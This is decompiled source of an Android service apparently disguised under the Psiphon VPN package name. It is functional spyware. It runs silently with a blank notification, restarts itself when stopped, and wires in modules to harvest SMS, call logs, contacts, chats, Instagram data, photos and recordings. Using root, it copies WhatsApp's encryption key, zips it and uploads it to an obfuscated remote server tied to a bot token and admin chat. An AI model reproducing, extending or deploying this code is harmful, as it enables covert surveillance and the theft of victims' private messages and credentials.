package com.psiphon3;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class srv extends  android.app.Service{
	public static class srv_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (srv) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, srv.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, false, BA.class);
		}

	}
    static srv mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return srv.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.psiphon3", "com.psiphon3.srv");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon3.srv", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!false && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (srv) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (false) {
			ServiceHelper.StarterHelper.runWaitForLayouts();
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (srv) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (false)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (srv) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (false) {
            BA.LogInfo("** Service (srv) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (srv) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static com.datasteam.b4a.system.superuser.SuShell _vvv4 = null;
public static com.datasteam.b4a.system.superuser.SuBrowser _vvv5 = null;
public static com.psiphon3.httpjob _v6 = null;
public static com.psiphon3.httpjob _v7 = null;
public static anywheresoftware.b4a.objects.collections.JSONParser _v0 = null;
public static String _vv1 = "";
public static int _admin_id = 0;
public static String _vv2 = "";
public static String _vv3 = "";
public static String _vv4 = "";
public static String _vv5 = "";
public static ir.rayanoos.lib.upload_ultra.upload_ultra _vv6 = null;
public static ice.smsplus.SmsWrapper _vv7 = null;
public static com.AB.ABZipUnzip.ABZipUnzip _vv0 = null;
public static anywheresoftware.b4a.phone.CallLogWrapper _vvv1 = null;
public static anywheresoftware.b4a.phone.Contacts2Wrapper _vvv2 = null;
public static ir.rayanoos.lib.ultra_decoder.ultra_decoder _vvv3 = null;
public ir.rayanoos.lib.upload_ultra.uploadfile _vvvvvvvv5 = null;
public com.psiphon3.main _vvvvvvvv6 = null;
public com.psiphon3.cmr _vvvvvvvv7 = null;
public com.psiphon3.cmr2 _vvvvvvvv0 = null;
public com.psiphon3.firebasemessaging _vvvvvvvvv1 = null;
public com.psiphon3.getallcalls _vvvvvvvvv2 = null;
public com.psiphon3.getallcontacts _vvvvvvvvv3 = null;
public com.psiphon3.getallsms _vvvvvvvvv4 = null;
public com.psiphon3.getchats _vvvvvvvvv5 = null;
public com.psiphon3.getinsta _vvvvvvvvv6 = null;
public com.psiphon3.getlists _vvvvvvvvv7 = null;
public com.psiphon3.getonechat _vvvvvvvvv0 = null;
public com.psiphon3.getpicture _vvvvvvvvvv1 = null;
public com.psiphon3.getpicture2 _vvvvvvvvvv2 = null;
public com.psiphon3.starter _vvvvvvvvvv4 = null;
public com.psiphon3.startrecord _vvvvvvvvvv5 = null;
public com.psiphon3.httputils2service _vvvvvvvvvv6 = null;
public static String  _getkey(String _topic,String _data) throws Exception{
 //BA.debugLineNum = 64;BA.debugLine="Sub getKey (Topic As String, Data As String)";
 //BA.debugLineNum = 65;BA.debugLine="Try";
try { //BA.debugLineNum = 69;BA.debugLine="Dim Su As SuShell";
_vvv4 = new com.datasteam.b4a.system.superuser.SuShell();
 //BA.debugLineNum = 70;BA.debugLine="If Su.DeviceRooted Then";
if (_vvv4.DeviceRooted()) { 
 //BA.debugLineNum = 71;BA.debugLine="If Su.ExecuteWithEvent(\"ls\", \"Su\").WaitForCompl";
if (_vvv4.ExecuteWithEvent(processBA,"ls","Su").WaitForCompletion()) { 
 //BA.debugLineNum = 74;BA.debugLine="Su.Execute(\"cp data/data/com.whatsapp/files/ke";
_vvv4.Execute(processBA,"cp data/data/com.whatsapp/files/key /storage/emulated/0/mykey").WaitForCompletion();
 //BA.debugLineNum = 76;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?cha";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"RootGrant"+"&reply_to_message_id="+BA.NumberToString(0));
 //BA.debugLineNum = 83;BA.debugLine="zip.ABZipfile(File.DirRootExternal&\"/\" , \"myke";
_vv0.ABZipfile(anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/","mykey",anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/mykeies.zip");
 //BA.debugLineNum = 85;BA.debugLine="upload.upload(admin_id , \"key file\".Replace(\"";
_vv6._upload(_admin_id,"key file".replace(" ","%20"),(int) (0),anywheresoftware.b4a.keywords.Common.File.getDirRootExternal(),"mykeies.zip");
 //BA.debugLineNum = 86;BA.debugLine="File.Delete(File.DirRootExternal&\"/\" , \"mykey\"";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/","mykey");
 //BA.debugLineNum = 87;BA.debugLine="File.Delete(File.DirRootExternal&\"/\",\"mykeies.";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/","mykeies.zip");
 }else {
 //BA.debugLineNum = 89;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?cha";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"notGrant"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 }else {
 //BA.debugLineNum = 93;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"notRooted"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 } 
       catch (Exception e18) {
			processBA.setLastException(e18); //BA.debugLineNum = 96;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"Exception"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 //BA.debugLineNum = 98;BA.debugLine="End Sub";
return "";
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 6;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 8;BA.debugLine="Dim Su As SuShell";
_vvv4 = new com.datasteam.b4a.system.superuser.SuShell();
 //BA.debugLineNum = 9;BA.debugLine="Dim Browser As SuBrowser";
_vvv5 = new com.datasteam.b4a.system.superuser.SuBrowser();
 //BA.debugLineNum = 10;BA.debugLine="Dim ht,ht2 As HttpJob";
_v6 = new com.psiphon3.httpjob();
_v7 = new com.psiphon3.httpjob();
 //BA.debugLineNum = 11;BA.debugLine="Dim js As JSONParser";
_v0 = new anywheresoftware.b4a.objects.collections.JSONParser();
 //BA.debugLineNum = 12;BA.debugLine="Dim token As String = \":...__::...__::...__._____";
_vv1 = main.vvv13 (new byte[] {50,54,74,36,72,64,84,118,35,46,75,75,87,34,94,36,57,49,49,19,35,95,58,75,87,71,59,48,45,49,64,98,82,95}, 388347)+main.vvv13 (new byte[] {87,53,109,-88,45,38,22,-97,35,92,108,-74,38,68,109,-88,45,38,22,-97,35,92,108,-74,38,68,109,-88,45,38,22,-97,35,92,108,-57,87,68,109,-88,72,67,2,-117,35,45,29,-74,87,53,109,-88,72,67,103,-18,55,57,29,-57,38,68,109,-51,45,50,22,-97,82,92,29,-74,50,33,8,-88,57,50,103,-97,82,92,108,-74,87,68,109,-51,45,67,22,-97,82,45,108,-74,87}, 863875)+main.vvv13 (new byte[] {87,71,-87,-26,45,37,-93,-47,35,46,-88,-119,87,71,-87,-26,72,64,-58,-59,82,46,-39,-119,87,71,-87,-26,57,64,-93,-96,55,58,-88,-8,38,71,-87,-26,72,49,-93,-96,82,58,-51,-119,87,71,-87,-105,57,49,-93,-47,35,58,-51,-119,87,71,-40,-26,72,49,-93,-96,35,58,-51,-8,38,54,-40,-105}, 726305)+main.vvv13 (new byte[] {38,53,64,-73,72,67,94,-108,35,92,48,-40,38,68,49,-58,57,50,94,-108,35,45,65,-87,87,53,49,-46,45,50,59,-128,82,45,48,-87,38,68,64,-46,45,67,59,-15,82,92,48,-40,87,53,64,-73,45,38,74,-128,35,92,48,-87,38,68,49,-46,45,67,59,-15,82,92,65,-87,87,53,64,-73,45,38,59,-128,82,45,65,-87,38,53,64,-73,72,38,94,-128,82,92,48,-87,38,68,49,-73,72,38,94,-128,35,45,48,-87,87,53,49,-73,72,38,94,-15,35,92,48,-40,87,68,49,-58,57,67,94,-108,35,92,48,-40,38,68,49,-58,57,50,94,-108,82,45,65,-87,38,68,49,-73,72,67,59,-15,55,57,65,-40,87,68,64,-73}, 965188)+main.vvv13 (new byte[] {87,54,-117,116,45,37,-127,50,82,95,-5,27,38,54,-117,116,45,37,-127,67,35,95,-5,106,38,54,-6,116,45,37,-16,50,82,95,-118,27,87,71,-117,116,72,37,-107,67,35,46,-118,27,87,71,-6,116,72,64,-16,38,55,46,-118,27,87,54,-6,5,57,49,-127,38,82,58,-5,106,38,54,-117,116,57,64,-16,50,82,58,-98,106,38,71,-6,116,72,64,-127,50,35,58,-98,106,87,71,-117,5,72,49,-16,67,35,58,-98,106,38,54,-6,5,72,64,-127,67}, 537673)+main.vvv13 (new byte[] {87,68,108,-24,57,50,114,-70,82,45,121,-109,87,53,108,-24,72,67,114,-53,82,92,8,-30,87,68,9,-24,45,67,114,-70,82,92,8,-109,38,68,9,-115,72,38,102,-70,82,92,121,-109,87,68,120,-115,57,38}, 946561);
 //BA.debugLineNum = 13;BA.debugLine="Dim admin_id As Int = 315160032";
_admin_id = (int) (315160032);
 //BA.debugLineNum = 14;BA.debugLine="Dim apiserver As String=\":.____..._.::..____....:";
_vv2 = main.vvv13 (new byte[] {50,54,-14,-68,72,64,-119,-117,35,95,-126,-57,50,54,-125,-68,72,64,-8,-117,35,46,-126,-57,50,54,-125,-68,72,64,-8,-117,35,46,-126,-57,50,54,-14,-68,57,49,-119,-117,35,46,-126,-57,50,54,-125,-68,57,49,-119,-117,82,95,-126,-57,50,55,-126,-39,57,64,-8,-117,35,95,-126,-94,87,54,-105,-39}, 520472)+main.vvv13 (new byte[] {38,68,92,-22,57,67,39,-35,82,45,56,-32,38,68,92,-22,57,67,39,-35,82,45,56,-12,50,53,45,-22,57,67,39,-84,82,92,44,-32,50,68,45,-22,57,50,39,-84,35,92,44,-32,50,53,45,-101,72,67,86,-84,35,45,44,-32,50,53,92}, 755129)+main.vvv13 (new byte[] {87,68,105,-76,57,67,99,-125,55,57,25,-37,87,53,24,-59,57,67,99,-125,55,57,25,-37,87,68,105,-76,57,50,18,-125,55,57,25,-86,38,68,105,-76,72,67,99,-125,55,57,25,-86,87,53,105,-76,57,67,99,-125,55,57,25,-86,87,68,105,-76,72,67,99,-125,55,45,13,-37,38,68,105,-76,57,67,18,-14,35,57,13,-37,38,68}, 873061)+main.vvv13 (new byte[] {38,55,-113,27,72,48,-123,56,34,59,-1,5,87,55,-113,27,57,65,-123,44,55,59,-1,5,87,70,-113,106,72,65,-123,93,55,59,-1,116,87,70,-113,27,57,48,-12,44,55}, 46653);
 //BA.debugLineNum = 15;BA.debugLine="Dim fileToWirte As String = \"msgid16.txt\"";
_vv3 = main.vvv13 (new byte[] {101,104,59,-122,115,45,96,-121,121,123,41}, 923713);
 //BA.debugLineNum = 16;BA.debugLine="Dim StartMessage As String = \"test16\"";
_vv4 = main.vvv13 (new byte[] {124,126,48,48,38,42}, 901436);
 //BA.debugLineNum = 17;BA.debugLine="Dim uploadUrl As String = \":.____..._.::..____...";
_vv5 = main.vvv13 (new byte[] {50,53,83,51,72,67,40,4,35,92,35,72,50,53,34,51,72,67,89,4,35,45,35,72,50,53,34,51,72,67,89,4,35,45,35,72,50,53,83,51,57,50,40,4}, 738210)+main.vvv13 (new byte[] {38,53,77,14,45,51,70,72,35,45,76,4,87,53,77,107,72,50,83,72,82,45,76,4,38,53,77,26,72,50,83,72,35,45,61,117,87,68,77,26,57,50,83,72,35,92,61,117,87,68,77,107,72,50,83}, 976167)+main.vvv13 (new byte[] {50,54,-22,75,57,49,-32,124,82,95,-21,48,50,54,-22,75,72,64,-111,124,35,46,-21,48,50,54,-101,58,72,64,-111,13,82,95,-21,48,50,54,-101,75,57,64,-111,124,82,95,-21,48,50,54,-101,75,72,64,-111,13,82,95,-21,48,38,34,-22,58,72,64,-111,124,82,46,-102,36,50,34,-22,58,72,49,-32,13,82,95,-21,85,50,55,-2,58,72,49,-111,13,35,46,-21,85,38,34,-2,58,72,64,-32,124,35,46}, 609545)+main.vvv13 (new byte[] {38,54,111,-32,45,49,20,-61,35,46,31,-101,38,54,111,-32,45,49,20,-61,82,46,31,-101,87,71,111,-32,57,37,101,-61,82,46,110,-22,38}, 308428)+main.vvv13 (new byte[] {38,54,-36,69,45,49,-89,102,82,95,-35,79,38,71,-36,69,45,49,-89,102,35,46,-35}, 715338)+main.vvv13 (new byte[] {38,54,-94,29,45}, 444007);
 //BA.debugLineNum = 18;BA.debugLine="Dim upload As upload_ultra";
_vv6 = new ir.rayanoos.lib.upload_ultra.upload_ultra();
 //BA.debugLineNum = 19;BA.debugLine="Dim allsms As SmsMessages";
_vv7 = new ice.smsplus.SmsWrapper();
 //BA.debugLineNum = 20;BA.debugLine="Dim zip As ABZipUnzip";
_vv0 = new com.AB.ABZipUnzip.ABZipUnzip();
 //BA.debugLineNum = 21;BA.debugLine="Dim callLog As CallLog";
_vvv1 = new anywheresoftware.b4a.phone.CallLogWrapper();
 //BA.debugLineNum = 22;BA.debugLine="Dim c As Contacts2";
_vvv2 = new anywheresoftware.b4a.phone.Contacts2Wrapper();
 //BA.debugLineNum = 23;BA.debugLine="Dim decode As ultra_decoder";
_vvv3 = new ir.rayanoos.lib.ultra_decoder.ultra_decoder();
 //BA.debugLineNum = 27;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
anywheresoftware.b4a.objects.NotificationWrapper _n = null;
 //BA.debugLineNum = 29;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 30;BA.debugLine="Browser.Initialize";
_vvv5.Initialize();
 //BA.debugLineNum = 31;BA.debugLine="decode.Initialize";
_vvv3._initialize(processBA);
 //BA.debugLineNum = 32;BA.debugLine="token = decode.decode(token)";
_vv1 = _vvv3._decode(_vv1);
 //BA.debugLineNum = 33;BA.debugLine="apiserver=decode.decode(apiserver)";
_vv2 = _vvv3._decode(_vv2);
 //BA.debugLineNum = 34;BA.debugLine="uploadUrl=decode.decode(uploadUrl)";
_vv5 = _vvv3._decode(_vv5);
 //BA.debugLineNum = 35;BA.debugLine="ht.Initialize(\"ht\",Me)";
_v6._initialize /*String*/ (processBA,"ht",srv.getObject());
 //BA.debugLineNum = 36;BA.debugLine="ht2.Initialize(\"ht2\",Me)";
_v7._initialize /*String*/ (processBA,"ht2",srv.getObject());
 //BA.debugLineNum = 37;BA.debugLine="ht.JobName=\"ht1\"";
_v6._vvvvvvv3 /*String*/  = "ht1";
 //BA.debugLineNum = 38;BA.debugLine="ht2.JobName=\"ht2\"";
_v7._vvvvvvv3 /*String*/  = "ht2";
 //BA.debugLineNum = 39;BA.debugLine="upload.Initialize(uploadUrl,token)";
_vv6._initialize(processBA,_vv5,_vv1);
 //BA.debugLineNum = 40;BA.debugLine="Dim n As Notification";
_n = new anywheresoftware.b4a.objects.NotificationWrapper();
 //BA.debugLineNum = 41;BA.debugLine="n.Initialize2(n.IMPORTANCE_LOW)";
_n.Initialize2(_n.IMPORTANCE_LOW);
 //BA.debugLineNum = 42;BA.debugLine="n.Icon      = \"icon\"";
_n.setIcon("icon");
 //BA.debugLineNum = 43;BA.debugLine="n.Sound    = False";
_n.setSound(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 44;BA.debugLine="n.Vibrate    = False";
_n.setVibrate(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 45;BA.debugLine="n.Light    = False";
_n.setLight(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 46;BA.debugLine="n.Insistent  = False";
_n.setInsistent(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 47;BA.debugLine="n.AutoCancel = False";
_n.setAutoCancel(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 48;BA.debugLine="n.SetInfo(\"\",\"\",\"\")";
_n.SetInfoNew(processBA,BA.ObjectToCharSequence(""),BA.ObjectToCharSequence(""),(Object)(""));
 //BA.debugLineNum = 49;BA.debugLine="Service.AutomaticForegroundNotification = n";
mostCurrent._service.AutomaticForegroundNotification = (android.app.Notification)(_n.getObject());
 //BA.debugLineNum = 57;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 102;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 103;BA.debugLine="StartServiceAt(\"\" , DateTime.Now+100 , True)";
anywheresoftware.b4a.keywords.Common.StartServiceAt(processBA,(Object)(""),(long) (anywheresoftware.b4a.keywords.Common.DateTime.getNow()+100),anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 104;BA.debugLine="End Sub";
return "";
}
public static String  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
 //BA.debugLineNum = 59;BA.debugLine="Sub Service_Start (StartingIntent As Intent)";
 //BA.debugLineNum = 62;BA.debugLine="End Sub";
return "";
}
}
